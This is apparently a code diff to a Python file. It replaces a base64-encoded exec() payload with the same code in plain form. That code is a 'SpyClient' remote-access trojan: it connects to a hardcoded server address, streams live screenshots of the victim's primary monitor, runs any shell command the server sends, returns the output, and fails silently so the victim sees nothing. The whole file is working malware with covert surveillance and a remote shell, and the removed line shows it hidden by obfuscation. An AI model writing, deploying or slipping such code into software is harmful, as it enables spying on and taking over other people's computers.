@@ -1,2 +1,115 @@
+import socket
+import struct
+import threading
+import time
+import mss
+import cv2
+import numpy as np
+import platform
+import subprocess
 import base64
-exec(base64.b64decode('aW1wb3J0IHNvY2tldAppbXBvcnQgc3RydWN0CmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHRpbWUKaW1wb3J0IG1zcwppbXBvcnQgY3YyCmltcG9ydCBudW1weSBhcyBucAppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGJhc2U2NAoKSE9TVCA9ICcxOTIuMTY4Ljg3LjE1NScgICMgWW91ciBzZXJ2ZXIgSVAgaGVyZQpQT1JUID0gOTk5OQoKSEVBREVSX0xFTiA9IDQKCkZSQU1FX1dJRFRIID0gMTI4MApGUkFNRV9IRUlHSFQgPSA3MjAKSlBFR19RVUFMSVRZID0gODAKRlBTID0gNjAgICMgNjAgZnJhbWVzIHBlciBzZWNvbmQKCmRlZiBzZW5kX3Jhd19tc2coc29jaywgbXNnKToKICAgIGxlbmd0aCA9IHN0cnVjdC5wYWNrKCchSScsIGxlbihtc2cpKQogICAgc29jay5zZW5kYWxsKGxlbmd0aCArIG1zZykKCmRlZiByZWN2X2FsbChzb2NrLCBsZW5ndGgpOgogICAgZGF0YSA9IGInJwogICAgd2hpbGUgbGVuKGRhdGEpIDwgbGVuZ3RoOgogICAgICAgIHBhY2tldCA9IHNvY2sucmVjdihsZW5ndGggLSBsZW4oZGF0YSkpCiAgICAgICAgaWYgbm90IHBhY2tldDoKICAgICAgICAgICAgcmV0dXJuIE5vbmUKICAgICAgICBkYXRhICs9IHBhY2tldAogICAgcmV0dXJuIGRhdGEKCmNsYXNzIFNweUNsaWVudDoKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBob3N0LCBwb3J0KToKICAgICAgICBzZWxmLnNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICAgICAgc2VsZi5zb2NrLmNvbm5lY3QoKGhvc3QsIHBvcnQpKQogICAgICAgIHNlbGYucnVubmluZyA9IFRydWUKCiAgICBkZWYgc2VuZF9tc2coc2VsZiwgaGVhZGVyLCBwYXlsb2FkKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNlbmRfcmF3X21zZyhzZWxmLnNvY2ssIGhlYWRlciArIHBheWxvYWQpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgc2VsZi5ydW5uaW5nID0gRmFsc2UKCiAgICBkZWYgdmlkZW9fc2VuZGVyKHNlbGYpOgogICAgICAgIHdpdGggbXNzLm1zcygpIGFzIHNjdDoKICAgICAgICAgICAgbW9uaXRvciA9IHNjdC5tb25pdG9yc1sxXSAgIyBQcmltYXJ5IG1vbml0b3IKICAgICAgICAgICAgZnJhbWVfaW50ZXJ2YWwgPSAxIC8gRlBTCiAgICAgICAgICAgIHdoaWxlIHNlbGYucnVubmluZzoKICAgICAgICAgICAgICAgIHN0YXJ0ID0gdGltZS50aW1lKCkKICAgICAgICAgICAgICAgIGltZyA9IG5wLmFycmF5KHNjdC5ncmFiKG1vbml0b3IpKQogICAgICAgICAgICAgICAgaW1nID0gY3YyLnJlc2l6ZShpbWcsIChGUkFNRV9XSURUSCwgRlJBTUVfSEVJR0hUKSkKICAgICAgICAgICAgICAgIF8sIGpwZyA9IGN2Mi5pbWVuY29kZSgnLmpwZycsIGltZywgW2ludChjdjIuSU1XUklURV9KUEVHX1FVQUxJVFkpLCBKUEVHX1FVQUxJVFldKQogICAgICAgICAgICAgICAgc2VsZi5zZW5kX21zZyhiJ1ZJRDAnLCBqcGcudG9ieXRlcygpKQogICAgICAgICAgICAgICAgZWxhcHNlZCA9IHRpbWUudGltZSgpIC0gc3RhcnQKICAgICAgICAgICAgICAgIHNsZWVwX3RpbWUgPSBmcmFtZV9pbnRlcnZhbCAtIGVsYXBzZWQKICAgICAgICAgICAgICAgIGlmIHNsZWVwX3RpbWUgPiAwOgogICAgICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoc2xlZXBfdGltZSkKCiAgICBkZWYgY29tbWFuZF9saXN0ZW5lcihzZWxmKToKICAgICAgICB3aGlsZSBzZWxmLnJ1bm5pbmc6CiAgICAgICAgICAgIGxlbmd0aF9kYXRhID0gcmVjdl9hbGwoc2VsZi5zb2NrLCBIRUFERVJfTEVOKQogICAgICAgICAgICBpZiBub3QgbGVuZ3RoX2RhdGE6CiAgICAgICAgICAgICAgICBzZWxmLnJ1bm5pbmcgPSBGYWxzZQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgbXNnX2xlbiA9IHN0cnVjdC51bnBhY2soJyFJJywgbGVuZ3RoX2RhdGEpWzBdCiAgICAgICAgICAgIG1zZyA9IHJlY3ZfYWxsKHNlbGYuc29jaywgbXNnX2xlbikKICAgICAgICAgICAgaWYgbm90IG1zZzoKICAgICAgICAgICAgICAgIHNlbGYucnVubmluZyA9IEZhbHNlCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBoZWFkZXIgPSBtc2dbOjRdCiAgICAgICAgICAgIGNvbnRlbnQgPSBtc2dbNDpdCiAgICAgICAgICAgIGlmIGhlYWRlciA9PSBiJ0NNRDAnOgogICAgICAgICAgICAgICAgc2VsZi5oYW5kbGVfY29tbWFuZChjb250ZW50KQoKICAgIGRlZiBoYW5kbGVfY29tbWFuZChzZWxmLCBjb250ZW50KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGRlY29kZWQgPSBiYXNlNjQuYjY0ZGVjb2RlKGNvbnRlbnQpLmRlY29kZShlcnJvcnM9J2lnbm9yZScpLnN0cmlwKCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBkZWNvZGVkID0gY29udGVudC5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKS5zdHJpcCgpCgogICAgICAgIGlmIGRlY29kZWQgPT0gImhvc3RuYW1lIjoKICAgICAgICAgICAgaG9zdG5hbWUgPSBwbGF0Zm9ybS5ub2RlKCkKICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKGYiSG9zdG5hbWU6IHtob3N0bmFtZX0iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGNvbXBsZXRlZCA9IHN1YnByb2Nlc3MucnVuKGRlY29kZWQsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSwgdGltZW91dD0xNSkKICAgICAgICAgICAgICAgIG91dHB1dCA9IGNvbXBsZXRlZC5zdGRvdXQgKyBjb21wbGV0ZWQuc3RkZXJyCiAgICAgICAgICAgICAgICBpZiBub3Qgb3V0cHV0LnN0cmlwKCk6CiAgICAgICAgICAgICAgICAgICAgb3V0cHV0ID0gIihObyBvdXRwdXQpIgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKG91dHB1dCkKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKGYiQ29tbWFuZCBmYWlsZWQ6IHtlfSIpCgogICAgZGVmIHNlbmRfcmVzcG9uc2Uoc2VsZiwgdGV4dCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBlbmNvZGVkID0gYmFzZTY0LmI2NGVuY29kZSh0ZXh0LmVuY29kZSgpKQogICAgICAgICAgICBzZWxmLnNlbmRfbXNnKGInUlNQMCcsIGVuY29kZWQpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgc2VsZi5ydW5uaW5nID0gRmFsc2UKCiAgICBkZWYgcnVuKHNlbGYpOgogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYudmlkZW9fc2VuZGVyLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuY29tbWFuZF9saXN0ZW5lciwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgICAgICB3aGlsZSBzZWxmLnJ1bm5pbmc6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMC4xKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIHRyeToKICAgICAgICBjbGllbnQgPSBTcHlDbGllbnQoSE9TVCwgUE9SVCkKICAgICAgICBjbGllbnQucnVuKCkKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcyAgIyBGYWlsIHNpbGVudGx5LCBubyBwb3B1cCBvciBvdXRwdXQK'))
+
+HOST = '192.168.87.155'  # Your server IP here
+PORT = 9999
+
+HEADER_LEN = 4
+
+FRAME_WIDTH = 1280
+FRAME_HEIGHT = 720
+JPEG_QUALITY = 80
+FPS = 60  # 60 frames per second
+
+def send_raw_msg(sock, msg):
+    length = struct.pack('!I', len(msg))
+    sock.sendall(length + msg)
+
+def recv_all(sock, length):
+    data = b''
+    while len(data) < length:
+        packet = sock.recv(length - len(data))
+        if not packet:
+            return None
+        data += packet
+    return data
+
+class SpyClient:
+    def __init__(self, host, port):
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.connect((host, port))
+        self.running = True
+
+    def send_msg(self, header, payload):
+        try:
+            send_raw_msg(self.sock, header + payload)
+        except Exception:
+            self.running = False
+
+    def video_sender(self):
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]  # Primary monitor
+            frame_interval = 1 / FPS
+            while self.running:
+                start = time.time()
+                img = np.array(sct.grab(monitor))
+                img = cv2.resize(img, (FRAME_WIDTH, FRAME_HEIGHT))
+                _, jpg = cv2.imencode('.jpg', img, [int(cv2.IMWRITE_JPEG_QUALITY), JPEG_QUALITY])
+                self.send_msg(b'VID0', jpg.tobytes())
+                elapsed = time.time() - start
+                sleep_time = frame_interval - elapsed
+                if sleep_time > 0:
+                    time.sleep(sleep_time)
+
+    def command_listener(self):
+        while self.running:
+            length_data = recv_all(self.sock, HEADER_LEN)
+            if not length_data:
+                self.running = False
+                break
+            msg_len = struct.unpack('!I', length_data)[0]
+            msg = recv_all(self.sock, msg_len)
+            if not msg:
+                self.running = False
+                break
+            header = msg[:4]
+            content = msg[4:]
+            if header == b'CMD0':
+                self.handle_command(content)
+
+    def handle_command(self, content):
+        try:
+            decoded = base64.b64decode(content).decode(errors='ignore').strip()
+        except Exception:
+            decoded = content.decode(errors='ignore').strip()
+
+        if decoded == "hostname":
+            hostname = platform.node()
+            self.send_response(f"Hostname: {hostname}")
+        else:
+            try:
+                completed = subprocess.run(decoded, shell=True, capture_output=True, text=True, timeout=15)
+                output = completed.stdout + completed.stderr
+                if not output.strip():
+                    output = "(No output)"
+                self.send_response(output)
+            except Exception as e:
+                self.send_response(f"Command failed: {e}")
+
+    def send_response(self, text):
+        try:
+            encoded = base64.b64encode(text.encode())
+            self.send_msg(b'RSP0', encoded)
+        except Exception:
+            self.running = False
+
+    def run(self):
+        threading.Thread(target=self.video_sender, daemon=True).start()
+        threading.Thread(target=self.command_listener, daemon=True).start()
+        while self.running:
+            time.sleep(0.1)
+
+if __name__ == "__main__":
+    try:
+        client = SpyClient(HOST, PORT)
+        client.run()
+    except Exception:
+        pass  # Fail silently, no popup or output
